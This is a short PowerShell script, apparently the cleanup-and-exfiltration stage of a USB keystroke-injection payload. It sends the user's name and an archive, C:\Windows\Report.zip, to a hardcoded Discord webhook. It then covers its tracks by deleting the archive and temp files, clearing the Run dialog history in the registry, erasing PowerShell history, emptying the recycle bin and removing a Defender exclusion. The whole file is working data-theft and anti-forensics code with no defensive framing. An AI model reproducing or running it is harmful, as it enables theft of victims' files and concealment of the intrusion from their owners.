Remove-MpPreference -ExclusionPath “C:”
$hookurl='https://discord.com/api/webhooks/1180337343920615434/dPohBhRKx_M_MeRIEQQjdOsPTydHKpwg_Vt6nOJU2ZeREXnDfQXV08laAiP2I45nQLBj'

$Body = @{'username' = $env:username; 'content' = "Obiwan: Hello there!"}
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json); curl.exe -F 'file1=@c:\Windows\Report.zip' $hookurl
rm -r C:\temp
rm -r C:\Windows\Report.zip

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

Remove-Item (Get-PSreadlineOption).HistorySavePath

Clear-RecycleBin -Force -ErrorAction SilentlyContinue
EXIT
